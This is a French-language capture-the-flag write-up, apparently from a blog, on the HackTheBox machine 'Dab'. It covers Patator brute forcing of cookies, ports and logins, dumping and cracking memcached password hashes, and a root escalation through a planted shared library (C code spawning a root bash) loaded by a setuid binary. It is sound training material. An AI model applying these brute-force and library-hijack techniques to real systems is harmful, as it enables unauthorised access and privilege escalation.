# Solution du CTF Dab de HackTheBox

Dab ?
-----

DAB... Distributeur Automatique de Billets... on va pas pirater ça quand même :D   

Non évidemment le nom de la box provient plutôt [des mouvements de bras](https://fr.wikipedia.org/wiki/Dab) et de la difficulté à trouver un nom pour un CTF :p  

100 patates !
-------------

Cette machine dispose d'un serveur FTP, un SSH ainsi que deux serveurs web :  

```plain
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            8803 Mar 26  2018 dab.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.99
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
8080/tcp open  http    nginx 1.10.3 (Ubuntu)
```

Le serveur FTP propose une image en connexion anonyme, vous n'aurez pas de mal à imaginer de quoi il s'agit.  

Sur le port 80 on trouve uniquement une page de login. En testant quelques noms d'utilisateurs on remarque tout de même une disparité : on obtient le message *Error: Login failed* avec le nom d'utilisateur *admin* et un mot de passe invalide alors qu'on obtient *Error: Login failed.* (notez le point final) avec un nom d'utilisateur moins probable.  

On est donc en mesure d'énumérer les utilisateurs par force brute.  

Maintenant le port 8080 : on est accueillit par un message *Access denied: password authentication cookie not set*.  

Un [gobuster](https://github.com/OJ/gobuster) sur ce port ne nous remonte qu'une URL */socket* qui retourne *Missing parameters*...  

Bref c'est le moment de patater !  

Premièrement essayons de retrouver le nom du cookie attendu :  

```plain
$ patator http_fuzz url='http://10.10.10.86:8080/' header='Cookie: FILE0=nawak;' 0=common_query_parameter_names.txt  -x ignore:clen=322
13:42:13 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 13:42 CET
13:42:13 patator    INFO -
13:42:13 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:42:13 patator    INFO - -----------------------------------------------------------------------------
13:42:19 patator    INFO - 200  496:324        0.054 | password                           |  1295 | HTTP/1.1 200 OK
13:42:43 patator    INFO - Hits/Done/Skip/Fail/Size: 1/5697/0/0/5697, Avg: 187 r/s, Time: 0h 0m 30s

Access denied: password authentication cookie incorrect
```

J'avoue qu'on aurait pu le trouver tout seul celui-ci. Continuons avec la valeur possible :  

```plain
$ patator http_fuzz url='http://10.10.10.86:8080/' header='Cookie: password=FILE0;' 0=common_query_parameter_names.txt  -x ignore:clen=324
13:45:18 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 13:45 CET
13:45:18 patator    INFO -
13:45:18 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:45:18 patator    INFO - -----------------------------------------------------------------------------
13:45:26 patator    INFO - 200  712:540        0.053 | secret                             |  1596 | HTTP/1.1 200 OK
13:45:48 patator    INFO - Hits/Done/Skip/Fail/Size: 1/5697/0/0/5697, Avg: 190 r/s, Time: 0h 0m 29s
```

Il faut donc un cookie *password* de valeur *secret*.  

Notez ici que pour déterminer la valeur passée à l'option *ignore* je fais une première passe rapide sans spécifier l'option pour noter sa valeur générique dans l'output, stoppe le process et relance avec l'option.  

Ici *clen* correspond aux nombres de caractères présents dans la page, ce qui génère souvent moins de faux positifs qu'utiliser la taille brute des réponses (*size*) qui est souvent du contenu compressé.  

Armé de cette info j'ai installé l'extension Firefox *Cookie Manager*, ce n'est clairement pas la meilleure mais elle a fait le job :  

![HackTheBox Dab CTF cookie edit](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/dab/dab_cookie_manager.png)

On se retrouve alors sur un formulaire permettant d'envoyer des données vers un port local de la machine :  

![HackTheBox Dab CTF socket send form](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/dab/dab_socket.png)

On peut aussi passer une plage numérique à Patator :  

```plain
$ patator http_fuzz url='http://10.10.10.86:8080/socket?port=RANGE0&cmd=hello' header='Cookie: password=secret;' 0=int:0-65535  -x ignore:code=500
10:20:29 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 10:20 CET
10:20:29 patator    INFO -
10:20:29 patator    INFO - code size:clen       time | candidate                          |   num | mesg
10:20:29 patator    INFO - -----------------------------------------------------------------------------
10:20:29 patator    INFO - 200  459:287        0.121 | 0                                  |     1 | HTTP/1.1 200 OK
10:20:29 patator    INFO - 200  801:629        0.172 | 22                                 |    23 | HTTP/1.1 200 OK
10:20:29 patator    INFO - 200  799:627        0.179 | 21                                 |    22 | HTTP/1.1 200 OK
10:20:30 patator    INFO - 200  1183:1010      0.113 | 80                                 |    81 | HTTP/1.1 400 Bad Request
10:22:15 patator    INFO - 200  1183:1010      0.073 | 8080                               |  8081 | HTTP/1.1 400 Bad Request
10:22:54 patator    INFO - 200  748:576        0.074 | 11211                              | 11212 | HTTP/1.1 200 OK
10:35:48 patator    INFO - Hits/Done/Skip/Fail/Size: 6/65536/0/0/65536, Avg: 71 r/s, Time: 0h 15m 19s
```

On a gagné un port intéressant : 11211 qui est [le port par défaut](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) pour [memcached](https://en.wikipedia.org/wiki/Memcached).  

Sur [cet article](http://niiconsulting.com/checkmate/2013/05/memcache-exploit/) ou en lisant le code du module [memcached\_extractor](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/gather/memcached_extractor.rb) de *Metasploit* on peut trouver quelques commandes que l'on peut passer à memcached.  

Ainsi en envoyant *stats items* j'ai le retour suivant :  

```plain
STAT items:16:number 1
STAT items:16:age 1024
STAT items:16:evicted 0
STAT items:16:evicted_nonzero 0
STAT items:16:evicted_time 0
STAT items:16:outofmemory 0
STAT items:16:tailrepairs 0
STAT items:16:reclaimed 0
STAT items:16:expired_unfetched 0
STAT items:16:evicted_unfetched 0
STAT items:16:crawler_reclaimed 0
STAT items:16:crawler_items_checked 0
STAT items:16:lrutail_reflocked 0
STAT items:26:number 1
STAT items:26:age 74
STAT items:26:evicted 0
STAT items:26:evicted_nonzero 0
STAT items:26:evicted_time 0
STAT items:26:outofmemory 0
STAT items:26:tailrepairs 0
STAT items:26:reclaimed 0
STAT items:26:expired_unfetched 0
STAT items:26:evicted_unfetched 0
STAT items:26:crawler_reclaimed 0
STAT items:26:crawler_items_checked 0
STAT items:26:lrutail_reflocked 0
END
```

Avec les commandes *stats cachedump 16 0* et *stats cachedump 26 0* on obtient respectivement les noms de clés *stock* et *users*.  

Malheureusement les commandes *get users* et *get stock* ne semblaient rien remonter (juste *END* qui signifie que les clés sont vides).  

J'ai donc décidé de revenir sur le port 80 pour brute-forcer les noms d'utilisateurs possibles :  

```plain
$ patator http_fuzz url='http://10.10.10.86/login' method=POST body='username=FILE0&password=nawak&submit=Login' 0=top500.txt -x ignore:clen=543
15:26:03 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-12 15:26 CET
15:26:03 patator    INFO -
15:26:03 patator    INFO - code size:clen       time | candidate                          |   num | mesg
15:26:03 patator    INFO - -----------------------------------------------------------------------------
15:26:03 patator    INFO - 200  714:542        0.045 | angela                             |    51 | HTTP/1.1 200 OK
15:26:04 patator    INFO - 200  714:542        0.077 | dallas                             |   152 | HTTP/1.1 200 OK
15:26:04 patator    INFO - 200  714:542        0.056 | florida                            |   188 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.070 | london                             |   278 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.055 | nicholas                           |   329 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.057 | nicole                             |   330 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.051 | paris                              |   339 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.041 | princess                           |   360 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.066 | sammy                              |   389 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.049 | samson                             |   390 | HTTP/1.1 200 OK
15:26:05 patator    INFO - 200  714:542        0.042 | sierra                             |   405 | HTTP/1.1 200 OK
15:26:06 patator    INFO - 200  714:542        0.055 | summer                             |   431 | HTTP/1.1 200 OK
15:26:06 patator    INFO - 200  714:542        0.059 | thomas                             |   446 | HTTP/1.1 200 OK
15:26:06 patator    INFO - 200  714:542        0.044 | winston                            |   481 | HTTP/1.1 200 OK
15:26:06 patator    INFO - Hits/Done/Skip/Fail/Size: 14/499/0/0/499, Avg: 150 r/s, Time: 0h 0m 3s
```

Cela ne m'a pas amené beaucoup plus loin mais a eu le bénéfice de débloquer le *memcached* puisqu'en redemandant la clé *users* celle-ci était désormais non vide :)  

L'output étant trop important je ne le posterais pas ici mais la clé est en réalité un dictionnaire JSON où les clés sont les noms d'utilisateurs et les valeurs des hashs MD5.  

Je n'ai pas gardé le script pour convertir le JSON en des lignes prêtes pour JTR mais ça pourrait se faire en one-liner pour toute personne maîtrisant bien Python.  

```plain
$ john --format=Raw-MD5 --wordlist=rockyou.txt hashes.txt
Loaded 495 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 12x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
    Password1        (admin)
    piggy            (abbigail)
    monkeyman        (ona)
    strength         (irma)
    blaster          (alec)
    megadeth         (wendell)
    misfits          (aglae)
    lovesucks1       (rick)
    Princess1        (genevieve)
    default          (default)
    hacktheplanet    (d_murphy)
    demo             (demo)
```

*Patator* est toujours à l'aise que ce soit en FTP :  

```plain
$ patator ftp_login user=COMBO00 password=COMBO01 0=combo.txt host=10.10.10.86 -t 1 --rate-limit=5
09:59:11 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 09:59 CET
09:59:11 patator    INFO -
09:59:11 patator    INFO - code  size    time | candidate                          |   num | mesg
09:59:11 patator    INFO - -----------------------------------------------------------------------------
09:59:19 patator    INFO - 530   16     3.580 | admin:Password1                    |     1 | Login incorrect.
09:59:27 patator    INFO - 530   16     2.474 | abbigail:piggy                     |     2 | Login incorrect.
09:59:35 patator    INFO - 530   16     2.771 | ona:monkeyman                      |     3 | Login incorrect.
09:59:48 patator    INFO - 530   16     3.224 | irma:strength                      |     4 | Login incorrect.
09:59:56 patator    INFO - 530   16     2.991 | alec:blaster                       |     5 | Login incorrect.
10:00:04 patator    INFO - 530   16     2.759 | wendell:megadeth                   |     6 | Login incorrect.
10:00:17 patator    INFO - 530   16     2.872 | aglae:misfits                      |     7 | Login incorrect.
10:00:25 patator    INFO - 530   16     2.971 | rick:lovesucks1                    |     8 | Login incorrect.
10:00:30 patator    INFO - 230   17     0.106 | genevieve:Princess1                |     9 | Login successful.
10:00:38 patator    INFO - 530   16     2.755 | default:default                    |    10 | Login incorrect.
10:00:46 patator    INFO - 530   16     2.853 | d_murphy:hacktheplanet             |    11 | Login incorrect.
10:00:54 patator    INFO - 530   16     3.293 | demo:demo                          |    12 | Login incorrect.
10:00:55 patator    INFO - Hits/Done/Skip/Fail/Size: 12/12/0/0/12, Avg: 0 r/s, Time: 0h 1m 44s
```

ou en SSH :  

```plain
$ patator ssh_login user=COMBO00 password=COMBO01 0=combo.txt host=10.10.10.86 -t 1 --rate-limit=5
10:25:22 patator    INFO - Starting Patator v0.7 (https://github.com/lanjelot/patator) at 2019-01-13 10:25 CET
10:25:22 patator    INFO -
10:25:22 patator    INFO - code  size    time | candidate                          |   num | mesg
10:25:22 patator    INFO - -----------------------------------------------------------------------------
10:25:30 patator    INFO - 1     22     2.135 | admin:Password1                    |     1 | Authentication failed.
10:25:38 patator    INFO - 1     22     2.756 | abbigail:piggy                     |     2 | Authentication failed.
10:25:45 patator    INFO - 1     22     1.536 | ona:monkeyman                      |     3 | Authentication failed.
10:25:52 patator    INFO - 1     22     2.358 | irma:strength                      |     4 | Authentication failed.
10:26:00 patator    INFO - 1     22     2.244 | alec:blaster                       |     5 | Authentication failed.
10:26:08 patator    INFO - 1     22     2.690 | wendell:megadeth                   |     6 | Authentication failed.
10:26:15 patator    INFO - 1     22     2.101 | aglae:misfits                      |     7 | Authentication failed.
10:26:22 patator    INFO - 1     22     2.108 | rick:lovesucks1                    |     8 | Authentication failed.
10:26:28 patator    INFO - 0     39     0.172 | genevieve:Princess1                |     9 | SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
10:26:36 patator    INFO - 1     22     2.514 | default:default                    |    10 | Authentication failed.
10:26:43 patator    INFO - 1     22     2.192 | d_murphy:hacktheplanet             |    11 | Authentication failed.
10:26:50 patator    INFO - 1     22     1.801 | demo:demo                          |    12 | Authentication failed.
10:26:51 patator    INFO - Hits/Done/Skip/Fail/Size: 12/12/0/0/12, Avg: 0 r/s, Time: 0h 1m 29s
```

Cet account nous permet de nous connecter en SSH et d'obtenir le premier flag :)  

Sous le capot
-------------

Même si ce n'est pas un passage obligatoire voici un peu d'explications sur le fonctionnement de ce CTF.  

En regardant la configuration du serveur web ont voit deux hôtes : *dev* (8080) et *prod* (80).  

Le code de la webapp est écrit en Python et au lieu d'utiliser le module socket il appelle un netcat (les habitués reconnaîtront la syntaxe de Flask) :  

```python
@app.route("/socket", methods=["GET"])
def socket_data():
    port = request.args.get("port", default="", type=int)
    cmd = request.args.get("cmd", default="", type=str)
    if not cmd or not port:
        error = "Missing parameters"
        return render_template("index.html", error=error)

    if port < 1 or port > 65535:
        error = "Invalid port"
        return render_template("index.html", error=error)

    if not validate_cmd(cmd):
        error = "Suspected hacking attempt detected"
        return render_template("index.html", error=error)

    data = check_output("echo '{}' | /bin/nc 127.0.0.1 {:d}".format(cmd, port), shell=True)

    return render_template("index.html", socket_data=data)
```

On pourrait penser à une injection de commande possible ici mais la fonction de validation fait largement le job :  

```python
def validate_cmd(cmd):
    match = re.match("^[a-zA-Z0-9 ]*$", cmd)
    return match is not None
```

Je pinaillerais en disant que le circonflexe n'est pas nécessaire si on utilise match... :D  

Côté *prod* on trouve des creds pour MySQL :  

```python
app = Flask(__name__)
app.config["MYSQL_DATABASE_USER"] = "dab_user"
app.config["MYSQL_DATABASE_PASSWORD"] = "kUi87_23$bxQsmk,a2"
app.config["MYSQL_DATABASE_DB"] = "dab"
app.config["MYSQL_DATABASE_HOST"] = "localhost"
app.config["SECRET_KEY"] = "todo_change_this"
app.config["SESSION_TYPE"] = "memcached"
```

Ils ne s'avèrent d'aucune utilité puisqu'il n'y a rien de plus ni de moins que dans le *memcached* :  

```python
if request.method == "POST":
    username = request.form["username"]
    password = request.form["password"]
    result = client.get("users")
    if result:
        users = json.loads(client.get("users"))
        # print "Loaded users from memcache"
    else:
        conn = mysql.connect().cursor()
        conn.execute("SELECT * FROM users")
        query_result_list = conn.fetchall()
        users = {}
        for query_result in query_result_list:
            users[query_result[0].lower()] = query_result[2]
        client.set("users", json.dumps(users), expire=30)
        # print "Loaded users from MySQL"
```

On voit ici que le script essaye d'abord d'obtenir les utilisateurs sur le *memcached*. En cas d'absence il requête MySQL et met les valeurs en cache ce qui explique que la liste des utilisateurs soit apparue après brute-force.  

Bad
---

Il est temps de passer à une exploration plus classique de la machine, par exemple en cherchant les fichiers et dossiers appartenant à root où l'on peut écrire :  

```bash
find / -user root -writable -not -path '/proc/*'  2> /dev/null
```

Quelle surprise de retrouver le dossier */etc/ld.so.conf.d* dans l'output !  

Cela signifie que l'on peut rajouter des paths où seront cherchées les librairies dynamiques sur le système.  

Vous allez me dire que pour que les changements soient pris en compte il faut aussi être en mesure d'appeler *ldconfig*... Et bien il s'avère qu'il est setuid root sur la machine :p  

Et comme si ça ne suffisait pas on trouve ce fichier dans le même dossier :  

```plain
-rw-r--r-- 1 root root 5 Mar 25  2018 test.conf
```

Et son contenu :  

```bash
$ cat test.conf
/tmp
```

Malgré tout on ne peut pas vraiment jouer sur l'ordre de recherche des librairies. De toute façon j'étais assez récalcitrant à l'idée d'hijacker une librairie du système.  

Il faut maintenant trouver des binaires setuid que l'on peut cibler pour notre attaque.  

Il y a un exécutable baptisé *try\_harder* :  

```plain
genevieve@dab:~$ ldd /usr/bin/try_harder
    linux-vdso.so.1 =>  (0x00007fff149d7000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe54d39e000)
    /lib64/ld-linux-x86-64.so.2 (0x00007fe54d768000)
```

Ce petit rigolo de binaire ne fait qu'afficher une fausse invite root, attendre la saisie d'une chaîne, attendre un peu avant de quitter avec un message.  

De plus le binaire est protégé via stack-protector et le *fgets* ne prend pas assez de données pour être vulnérable donc pas de regrets...  

![HackTheBox Dab CTF try_harder CTF](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/dab/dab_try_harder.png)

En revanche il y a un autre binaire qui ne m'a pas sauté immédiatement aux yeux et qui fait appel à une librairie custom :  

```plain
genevieve@dab:~$ ldd /usr/bin/myexec
    linux-vdso.so.1 =>  (0x00007ffe415cd000)
    libseclogin.so => /usr/lib/libseclogin.so (0x00007f4cc9f39000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4cc9b6f000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f4cca13b000)
```

Ce binaire demande un mot de passe avant de faire appel à la fonction importée *seclogin*. C'est très simple de le retrouver dans le code.  

D'après la valeur des registres on devine que le prototype de cette fonction ne prend aucun argument.  

![HackTheBox Dab CTF myexec binary](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/dab/dab_myexec.png)

L'exploitation est en tout point similaire à un scénario du type LD\_PRELOAD :  

```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

// gcc -Wall -fPIC -c -o seclogin.o seclogin.c
// gcc -shared -fPIC -Wl,-soname -Wl,libseclogin.so -o libseclogin.so seclogin.o
void seclogin(void)
{
        setreuid(0, 0);
        setregid(0, 0);
        system("/bin/bash");
        return 0;
}
```

On compile, on place la librairie dans */tmp*, on exécute *myexec*, on rentre le mot de passe attendu et à nous le shell root et le flag final :)  

![HackTheBox Dab CTF  final exploit](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/dab/dab_root.png)

Outro
-----

Un write-up comme une recette de *Savoie* : beaucoup de patates et du fromage par dessus :D

*Published February 02 2019 at 16:42*